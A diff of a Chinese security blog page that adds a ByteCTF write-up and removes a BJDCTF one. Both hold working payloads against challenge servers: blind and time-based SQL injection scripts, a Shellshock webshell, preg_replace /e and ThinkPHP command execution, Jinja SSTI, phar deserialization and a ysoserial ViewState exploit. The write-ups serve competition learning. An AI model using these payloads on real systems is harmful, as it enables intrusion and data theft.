@@ -66,6 +66,268 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-bytectfwp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/20/bytectfwp/" class="article-date">
+  <time class="dt-published" datetime="2020-04-20T12:50:44.547Z" itemprop="datePublished">2020-04-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/04/20/bytectfwp/">bytectf wp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="bytectf-wp"><a href="#bytectf-wp" class="headerlink" title="bytectf wp"></a>bytectf wp</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="baby-blog"><a href="#baby-blog" class="headerlink" title="baby_blog"></a>baby_blog</h3><p>在edit.php中:</p>
+<pre><code class="php">if($_SESSION[&#39;id&#39;] == $row[&#39;userid&#39;]){
+        $title = addslashes($_POST[&#39;title&#39;]);
+        $content = addslashes($_POST[&#39;content&#39;]);
+        $sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);
+    }</code></pre>
+<p><code>$sql-&gt;query(&quot;update article set title=&#39;$title&#39;,content=&#39;$content&#39; where title=&#39;&quot; . $row[&#39;title&#39;] . &quot;&#39;;&quot;);</code></p>
+<p>$row[‘title’] 没有进行任何过滤,直接插入到sql语句中,而插入数据库中的title没有再次对引号进行转义,形成注入点</p>
+<p>sql盲注判断脚本:</p>
+<pre><code class="python">import requests
+from bs4 import BeautifulSoup
+anti_disturb_key=&#39;cjb_ccreater_s_test&#39;
+PHPSESSID=&#39;404i3uiletdpke9rb0egs7vf47&#39;
+check_article_id=20
+def check(check_title):
+    url=&#39;http://112.125.24.134:9999/edit.php?id=&#39;+str(check_article_id)
+    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
+    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
+    title=bs.find(&#39;input&#39;,attrs={&#39;name&#39;:&quot;title&quot;})[&#39;value&#39;]
+    content=bs.find(&#39;textarea&#39;,attrs={&#39;name&#39;:&quot;content&quot;}).text
+    if title[:len(anti_disturb_key)]!=anti_disturb_key :
+        return &#39;disturb&#39;
+    elif content!=&#39;success&#39;+check_title:
+        return &#39;false&#39;
+    else :
+        return &#39;success&#39;
+
+
+
+def make_write(title,info):
+    data={
+        &#39;title&#39;:title,
+        &#39;content&#39;:info
+    }
+    url=&#39;http://112.125.24.134:9999/writing.php&#39;
+    res=requests.post(url,data=data,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
+    if res.status_code==200:
+        return True
+    else :
+        return False
+
+def get_newest_id():
+    url=&#39;http://112.125.24.134:9999/index.php&#39;
+    res=requests.get(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID})
+    bs=BeautifulSoup(res.text, &#39;html.parser&#39;)
+    newest_id=bs.find(&#39;article&#39;).find(&#39;footer&#39;).find(&#39;a&#39;)[&#39;href&#39;]
+    newest_id=newest_id[newest_id.index(&#39;=&#39;)+1:]
+    return int(newest_id)
+
+def sql_inject(sql):
+    title=anti_disturb_key+&quot;&#39; or (id=&quot;+str(check_article_id)+&quot; and (&quot;+sql+&#39;))#&#39;
+    info=&#39;success&#39;+title
+    if make_write(title,info):
+        #编辑id=newest_id的文章来读取$raw[&#39;title&#39;]
+        newest_id=get_newest_id()
+        url=&#39;http://112.125.24.134:9999/edit.php&#39;
+        data={
+            &#39;title&#39;:title,
+            &#39;content&#39;:info,
+            &#39;id&#39;:newest_id
+        }
+        res=requests.post(url,cookies={&#39;PHPSESSID&#39;:PHPSESSID},data=data)
+        #判断盲注结果
+        result=check(title)
+        if result==&#39;success&#39;:
+            return True
+        elif result==&#39;disturb&#39;:
+            print(&quot;受到干扰,重新执行&quot;)
+            return sql_inject(sql)
+        else :
+            return False
+    else :
+        print(&#39;程序执行错误,请保持结果&#39;)
+        eval(input(&#39;执行命令:&#39;))
+
+#demo 
+#sql=&#39;(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),index,1)))=guess&#39;
+sql=&#39;&#39;&#39;
+(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=&#39;information_schema&#39;)=guess 
+&#39;&#39;&#39;
+### 数据库名:696e666f726d6174696f6e5f736368656d612c62616279626c6f67
+#猜information_schema表名
+#vip用户:wulaxc4ca4238a0b923820dcc509a6f75849b
+result=&quot;4348415241435445525F534554532C434F4C4C4154494F4E532C434F4C4C4154494F4E5F4348415241435445525F5345545F4150504C49434142494C4954592C434F4C554D4E532c434f4c554d4e5f50524956494c454745532c454e47494e45532c4556454e54532c46494c45532c474c4f42414c5f5354415455532c474c4f42414c5f5641524941424c45532c4b45595f434f4c554d4e5f55534147452c504152414d45544552532c504152544954494f4e532c504c5547494e532c50524f434553534c4953542c50524f46494c494e472c5245464552454e5449414c5f434f4e53545241494e54532c524f5554494e45532c534348454d4154412c534348454d415f50524956494c454745532c53455353494f4e5f5354415455532c53455353494f4e5f5641524941424c45532c535441544953544943532c5441424c45532c5441424c455350414345532c5441424c455f434f4e53545241494e54532c5441424c455f50524956494c454745532c54524947474552532c555345525f50524956494c454745532c&quot;
+
+index=len(result)
+while 1:
+    index+=1
+    temp=sql.replace(&#39;index&#39;,str(index))
+    for i in range(20):
+        print(&quot;猜测第&quot;+str(index)+&quot;位为:&quot;+str(i))
+        if sql_inject(temp.replace(&#39;guess&#39;,str(i))):
+            result+=hex(i)[2:]
+            break
+    print(result)
+    res=&#39;&#39;
+    for i in range(0,len(result),2):
+        res+=chr(int(result[i:i+2],16))
+    print(res)
+
+</code></pre>
+<p>filter=<code>(SELECT|DELETE)@{0,2}(\\(.+\\)|\\s+?.+?\\s+?|(</code>|’|&quot;).<em>?(<code>|&#39;|\&quot;)|(\+|-|~|!|@:=|&quot; . urldecode(&#39;%0B&#39;) . &quot;).+?)FROM(\\(.+\\)|\\s+?.+?|(</code>|’|&quot;).</em>?(<code>|&#39;|\&quot;))</code><br>ban掉了select 语句<br>如果拿到vip权限可以用替换绕过<br><code>(select&#39;&#39;+conv(substr(hex(group_concat(table_name)),index,1),16,10) FROM information_schema.tables WHERE TABLE_SCHEMA=database())=guess</code>绕过正则过滤</p>
+<p>拿到vip账号:wulax,密码:1,网址:<a href="http://112.126.101.16:9999" target="_blank" rel="noopener">http://112.126.101.16:9999</a></p>
+<p>看到replace.php里的preg_replace()猜测突破点在这里,利用<code>/e%00</code>来截断末尾的斜杠,从而达到命令执行的效果</p>
+<p>命令执行利用脚本:</p>
+<pre><code class="python">import requests
+
+url=&quot;http://112.126.101.16:9999&quot;
+arc_id=&quot;11&quot;
+session=&quot;5lrk8g0oh73su3q9dbfp9l79f2&quot;
+text=&#39;&#39;&#39;
+&lt;?php 
+# Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) 
+# Google Dork: none 
+# Date: 10/31/2014 
+# Exploit Author: Ryan King (Starfall) 
+# Vendor Homepage: http://php.net 
+# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror 
+# Version: 5.* (tested on 5.6.2) 
+# Tested on: Debian 7 and CentOS 5 and 6 
+# CVE: CVE-2014-6271 
+
+function shellshock($cmd) { // Execute a command via CVE-2014-6271 @mail.c:283 
+   $tmp = tempnam(&quot;.&quot;,&quot;data&quot;); 
+   $headers =  &#39;MIME-Version: 1.0&#39; . &quot;\r\n&quot;; 
+    $headers .= &#39;From: Your name &lt;info@address.com&gt;&#39; . &quot;\r\n&quot;;
+    $headers .= &#39;Content-type: text/html; charset=iso-8859-1&#39; . &quot;\r\n&quot;; 
+
+   putenv(&quot;PHP_LOL=() { x; }; $cmd &gt;$tmp 2&gt;&amp;1&quot;); 
+   // In Safe Mode, the user may only alter environment variableswhose names 
+   // begin with the prefixes supplied by this directive. 
+   // By default, users will only be able to set environment variablesthat 
+   // begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, 
+   // PHP will let the user modify ANY environment variable! 
+   mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,$headers,&quot;-bv&quot;); // -bv so we don&#39;t actuallysend any mail 
+   $output = @file_get_contents($tmp); 
+   @unlink($tmp); 
+   if($output != &quot;&quot;) return $output; 
+   else return &quot;No output, or not vuln.&quot;; 
+} 
+echo shellshock($_REQUEST[&quot;cmd&quot;]); 
+?&gt;
+&#39;&#39;&#39;
+def edit():
+    data={
+        &quot;title&quot;:&quot;bbb&quot;,
+        &quot;content&quot;:&quot;b&quot;,
+        &quot;id&quot;:arc_id
+    }
+    return requests.post(url+&quot;/edit.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
+def exec(s):
+    data={
+        &quot;replace&quot;:s,#&quot;var_dump(scandir(&#39;/tmp&#39;));var_dump(file_put_contents(&#39;/tmp/aaa.php&#39;,&quot;+&quot;$_POST[&#39;cmd&#39;]&quot;+&quot;));&quot;,
+        &quot;regex&quot;:&quot;1&quot;,
+        &quot;id&quot;:arc_id,
+        &quot;find&quot;:&quot;b/e\x00&quot;,
+        &quot;cmd&quot;:&quot;ls -al&quot;,
+        &quot;filepath&quot;:&quot;/tmp/hpdoger.php&quot;
+    }
+    result=requests.post(url+&quot;/replace.php&quot;,data=data,cookies={&quot;PHPSESSID&quot;:session})
+    edit()
+    return result
+while 1:
+    print(exec(input()).text)</code></pre>
+<p>emmmm..到这里就不会做了.到头了.</p>
+<p>后来发现有个antsystem()</p>
+<p>vardump(antsystem(‘/readfile’));</p>
+<h3 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h3><p>哈希扩展攻击拿到admin权限</p>
+<p>代码审计发现</p>
+<p>在config.php下</p>
+<pre><code class="php">class File{
+    public $filename;
+    public $filepath;
+    public $checker;
+    function __construct($filename, $filepath)
+    {
+        $this-&gt;filepath = $filepath;
+        $this-&gt;filename = $filename;
+    }
+    function __destruct()
+    {
+        if (isset($this-&gt;checker)){
+            $this-&gt;checker-&gt;upload_file();
+        }
+    }
+    public function view_detail(){
+
+        if (preg_match(&#39;/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i&#39;, $this-&gt;filepath)){
+            die(&quot;nonono~&quot;);
+        }
+        $mine = mime_content_type($this-&gt;filepath);
+        $store_path = $this-&gt;open($this-&gt;filename, $this-&gt;filepath);
+        $res[&#39;mine&#39;] = $mine;
+        $res[&#39;store_path&#39;] = $store_path;
+        return $res;
+
+    }
+}</code></pre>
+<p>过滤phar并且明明没有给<code>$checker</code>赋值的点,在销毁的时候却会调用它,明显是一个为了出题而写的地方猜测phar反序列化利用,而mime_content_type()恰好又是反序列化的利用点</p>
+<p>最后在view.php处找到调用view_detail的地方</p>
+<p>由于题目不限制.php文件的上传,但是题目会写一个非法.htaccess</p>
+<p>所以我们可以可以试着删除它</p>
+<p>构造pop链:</p>
+<p><code>FILE::view_detail(mime_content_type)-&gt;FILE::__destruct(upload_file())-&gt;Profile::__call(open())-&gt;ZipArchive::open(file,ZipArchive::OVERWRITE)</code></p>
+<p>phar文件生成后就是要考虑如何绕过<code>(^phar)</code>的限制,</p>
+<p>我觉得这才是这一题最骚的地方:</p>
+<p><code>filepath=php://filter/resource=phar://sandbox/a87136ce5a8b85871f1d0b6b2add38d2/dd7ec931179c4dcb6a8ffb8b8786d20b.txt</code></p>
+<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><p>这次最开心的就是做misc的题目</p>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><h3 id="betgame"><a href="#betgame" class="headerlink" title="betgame"></a>betgame</h3><p>发现猜拳规律</p>
+<p>计算机第一次出与被显示的选择克制的选择(显示:s,实际出:j)</p>
+<p>计算机第二次出与克制显示的选择的选择(显示:s,实际出:b)</p>
+<p>计算机第三次出显示的选择(显示:s,实际出:s)</p>
+<p>然后手动pk :D</p>
+<h3 id="jigsaw"><a href="#jigsaw" class="headerlink" title="jigsaw"></a><strong>jigsaw</strong></h3><p><img src="https://i.loli.net/2019/09/09/eDQhxkWYUsvZdVa.png" alt="image.png"></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/04/20/bytectfwp/">http://blog.ccreater.top/2020/04/20/bytectfwp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/04/20/bytectfwp/" data-id="cka3ckr2h001ev4v0hxa703sn" data-title="bytectf wp" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-d3ctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/04/20/d3ctf2019/" class="article-date">
@@ -2611,385 +2873,6 @@ public class ServeScreenshotServlet extends HttpServlet
 
 
   
-    <article id="post-BJDCTF" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/03/25/BJDCTF/" class="article-date">
-  <time class="dt-published" datetime="2020-03-25T05:50:32.210Z" itemprop="datePublished">2020-03-25</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/03/25/BJDCTF/">BJDCTF</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="BJDCTF"><a href="#BJDCTF" class="headerlink" title="BJDCTF"></a>BJDCTF</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><pre><code>{{%27%27.__class__.__mro__[1].__subclasses__()[-13].__init__.__globals__.__builtins__.eval(%27__import__("os").popen("find%20/%20-name%20*flag*").read()%27)}}</code></pre><h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old_hack"></a>old_hack</h3><pre><code class="php">POST /?s=captcha HTTP/1.1
-Host: eb9ceebf-0bf5-4943-8580-9ccbf630568e.node3.buuoj.cn
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
-Connection: close
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-DNT: 1
-Upgrade-Insecure-Requests: 1
-Cache-Control: max-age=0
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 70
-
-_method=__construct&amp;filter%5B%5D=system&amp;method=get&amp;get%5B%5D=cat+/flag</code></pre>
-<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><pre><code class="php">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;give me a girl&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-&lt;?php
-error_reporting(0);
-echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;
-if (!isset($_POST[&#39;girl_friend&#39;])) {
-    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);
-} else {
-    $girl = $_POST[&#39;girl_friend&#39;];
-    if (preg_match(&#39;/\&gt;|\\\/&#39;, $girl)) {
-        die(&#39;just girl&#39;);
-    } else if (preg_match(&#39;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#39;, $girl)) {
-        echo &quot;&lt;img src=&#39;img/p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;
-    } else {
-        //duangShell~~~~
-        exec($girl);
-    }
-}
-
-</code></pre>
-<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><pre><code class="python">username=a\&amp;password=/if(1,sleep(5),1)%23
-username=a\&amp;password=/if(select/**/substr(group_concat(database()),1,1),sleep(5),1)%23
-username=a\&amp;password=/if(substr(hex(password),1,1)&lt;5,sleep(5),1)%23</code></pre>
-<p>过滤:<code>=,&#39;,;</code></p>
-<pre><code class="python">import requests
-import time
-burp0_url = &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn:80/index.php&quot;
-burp0_cookies = {&quot;_ga&quot;: &quot;GA1.2.212283867.1584191400&quot;, &quot;_gid&quot;: &quot;GA1.2.1374622556.1584775121&quot;}
-burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot;, &quot;Origin&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://f9dc5389-32c2-48b6-a208-cd32482ef972.node3.buuoj.cn/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
-burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),1,1)&lt;5,sleep(6),1)#&quot;}
-count=0
-result=&quot;&quot;
-while True:
-    count+=1
-    for i in &quot;123456789ABCDEFG&quot;:
-        burp0_data = {&quot;username&quot;: &quot;a\\&quot;, &quot;password&quot;: &quot;/if(substr(hex(password),POS,1)&lt;GUESS,sleep(5),1)#&quot;.replace(&quot;POS&quot;,str(count)).replace(&quot;GUESS&quot;,hex(ord(i)))}
-        print(burp0_data[&#39;password&#39;])
-        try:
-            requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,timeout=5)
-            time.sleep(0.5)
-        except:
-            result+=chr(ord(i)-1)
-            print(result)
-            break
-print(result)#4F68794F75464F754E646974#OhyOuFOuNdit
-requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</code></pre>
-<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>更改cookie拿到密码</p>
-<p>av11664517@1583985203.</p>
-<p> <a href="https://www.bilibili.com/video/av11664517" target="_blank" rel="noopener">https://www.bilibili.com/video/av11664517</a> </p>
-<p> BJD{Quantum_Mechanics_really_Ez} </p>
-<h3 id="asp"><a href="#asp" class="headerlink" title="asp"></a>asp</h3><p> <a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/" target="_blank" rel="noopener">https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</a> </p>
-<pre><code>http://ff9359c1-85b4-4f2a-a1ad-31c1e40f186d.node3.buuoj.cn//ImgLoad.aspx?path=5.gif</code></pre><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
-&lt;configuration&gt;
-&lt;system.web&gt;
-&lt;machineKey validationKey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot; decryptionKey=&quot;B0E528C949E59127E7469C9AF0764506BAFD2AB8150A75A5&quot; validation=&quot;SHA1&quot; decryption=&quot;3DES&quot; /&gt;
-&lt;/system.web&gt;
-&lt;/configuration&gt;
-</code></pre><p>validationKey泄露,利用viewstatas来任意命令执行</p>
-<pre><code>ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile  -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;  --generator=&quot;CA0B0334&quot;  --validationalg=&quot;SHA1&quot;  --validationkey=&quot;47A7D23AF52BEF07FB9EE7BD395CD9E19937682ECB288913CE758DE5035CF40DC4DB2B08479BF630CFEAF0BDFEE7242FC54D89745F7AF77790A4B5855A08EAC9&quot;</code></pre><h3 id="套猪"><a href="#套猪" class="headerlink" title="套猪"></a>套猪</h3><p>登陆后找到一个提示</p>
-<p> L0g1n.php</p>
-<p>经过输入一系列http头后拿到flag</p>
-<pre><code>GET /L0g1n.php HTTP/1.1
-Host: node3.buuoj.cn:25341
-Pragma: no-cache
-Cache-Control: no-cache
-Upgrade-Insecure-Requests: 1
-User-Agent: Contiki/1.1-rc1 (Commodore 64; http://dunkels.com/adam/contiki/)
-From: root@gem-love.com
-Referer: gem-love.com
-Client-Ip: 127.0.0.1
-Via: y1ng.vip
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; time=4740514103
-Connection: close
-
-</code></pre><h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><pre><code class="python">import requests
-import time
-arr=[&quot;H&quot;, &quot;He&quot;, &quot;Li&quot;, &quot;Be&quot;, &quot;B&quot;, &quot;C&quot;, &quot;N&quot;, &quot;O&quot;, &quot;F&quot;, &quot;Ne&quot;, &quot;Na&quot;, &quot;Mg&quot;, &quot;Al&quot;, &quot;Si&quot;, &quot;P&quot;, &quot;S&quot;, &quot;Cl&quot;, &quot;Ar&quot;, &quot;K&quot;, &quot;Ca&quot;, &quot;Sc&quot;, &quot;Ti&quot;, &quot;V&quot;, &quot;Cr&quot;, &quot;Mn&quot;, &quot;Fe&quot;, &quot;Co&quot;, &quot;Ni&quot;, &quot;Cu&quot;, &quot;Zn&quot;, &quot;Ga&quot;, &quot;Ge&quot;, &quot;As&quot;, &quot;Se&quot;, &quot;Br&quot;, &quot;Kr&quot;, &quot;Rb&quot;, &quot;Sr&quot;, &quot;Y&quot;, &quot;Zr&quot;, &quot;Nb&quot;, &quot;Mo&quot;, &quot;Te&quot;, &quot;Ru&quot;, &quot;Rh&quot;, &quot;Pd&quot;, &quot;Ag&quot;, &quot;Cd&quot;, &quot;In&quot;, &quot;Sn&quot;, &quot;Sb&quot;, &quot;Te&quot;, &quot;I&quot;, &quot;Xe&quot;, &quot;Cs&quot;, &quot;Ba&quot;, &quot;La&quot;, &quot;Ce&quot;, &quot;Pr&quot;, &quot;Nd&quot;, &quot;Pm&quot;, &quot;Sm&quot;, &quot;Eu&quot;, &quot;Gd&quot;, &quot;Tb&quot;, &quot;Dy&quot;, &quot;Ho&quot;, &quot;Er&quot;, &quot;Tm&quot;, &quot;Yb&quot;, &quot;Lu&quot;, &quot;Hf&quot;, &quot;Ta&quot;, &quot;W&quot;, &quot;Re&quot;, &quot;Os&quot;, &quot;Ir&quot;, &quot;Pt&quot;, &quot;Au&quot;, &quot;Hg&quot;, &quot;Tl&quot;, &quot;Pb&quot;, &quot;Bi&quot;, &quot;Po&quot;, &quot;At&quot;, &quot;Rn&quot;, &quot;Fr&quot;, &quot;Ra&quot;, &quot;Ac&quot;, &quot;Th&quot;, &quot;Pa&quot;, &quot;U&quot;, &quot;Np&quot;, &quot;Pu&quot;, &quot;Am&quot;, &quot;Cm&quot;, &quot;Bk&quot;, &quot;Cf&quot;, &quot;Es&quot;, &quot;Fm&quot;,&quot;Md&quot;,&quot;No&quot;,&quot;Lr&quot;,&quot;Ku&quot;,&quot;Ha&quot;]
-
-url=&quot;http://aca57d0d-cd67-498b-a8ea-09588ab05db6.node3.buuoj.cn/&quot;
-for i in arr:
-    r=requests.get(url+i+&quot;.php&quot;)
-    if r.status_code==200:
-        print(r.text,end=&quot;&quot;)
-    time.sleep(0.5)
-</code></pre>
-<p><code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code></p>
-<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>sb题目</p>
-<p>index.php</p>
-<pre><code class="php">&lt;?php
-   $a=$_GET[&#39;yds_is_so_beautiful&#39;];
-    echo unserialize($a);
-   ?&gt;</code></pre>
-<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>http头中找到hint:<code>home.php</code></p>
-<pre><code>http://3801f870-f245-47ef-8325-1e117f384eb8.node3.buuoj.cn/home.php?file=system</code></pre><p>尝试文件包含,拿到源码</p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !== sha1(md5(&#39;y1ng&#39;))){
-    echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;/script&gt;&quot;;
-    header(&quot;Refresh:0.1;url=index.php&quot;);
-    die;
-}
-
-$str2 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;
-$str3 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;
-$str4 = &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;
-
-?&gt;
-&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
-    &lt;title&gt;File Detector&lt;/title&gt;
-
-    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/normalize.css&quot; /&gt;
-    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/demo.css&quot; /&gt;
-
-    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;css/component.css&quot; /&gt;
-
-    &lt;script src=&quot;js/modernizr.custom.js&quot;&gt;&lt;/script&gt;
-
-&lt;/head&gt;
-&lt;body&gt;
-&lt;section&gt;
-    &lt;form id=&quot;theForm&quot; class=&quot;simform&quot; autocomplete=&quot;off&quot; action=&quot;system.php&quot; method=&quot;post&quot;&gt;
-        &lt;div class=&quot;simform-inner&quot;&gt;
-            &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;
-            &lt;ol class=&quot;questions&quot;&gt;
-                &lt;li&gt;
-                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ ç¥éç®å½ä¸é½æä»ä¹æä»¶å?&lt;/label&gt;&lt;/span&gt;
-                    &lt;input id=&quot;q1&quot; name=&quot;q1&quot; type=&quot;text&quot;/&gt;
-                &lt;/li&gt;
-                &lt;li&gt;
-                    &lt;span&gt;&lt;label for=&quot;q2&quot;&gt;è¯·è¾å¥ä½ æ³æ£æµæä»¶åå®¹é¿åº¦çurl&lt;/label&gt;&lt;/span&gt;
-                    &lt;input id=&quot;q2&quot; name=&quot;q2&quot; type=&quot;text&quot;/&gt;
-                &lt;/li&gt;
-                &lt;li&gt;
-                    &lt;span&gt;&lt;label for=&quot;q1&quot;&gt;ä½ å¸æä»¥ä½ç§æ¹å¼è®¿é®ï¼GETï¼POST?&lt;/label&gt;&lt;/span&gt;
-                    &lt;input id=&quot;q3&quot; name=&quot;q3&quot; type=&quot;text&quot;/&gt;
-                &lt;/li&gt;
-            &lt;/ol&gt;
-            &lt;button class=&quot;submit&quot; type=&quot;submit&quot; value=&quot;submit&quot;&gt;æäº¤&lt;/button&gt;
-            &lt;div class=&quot;controls&quot;&gt;
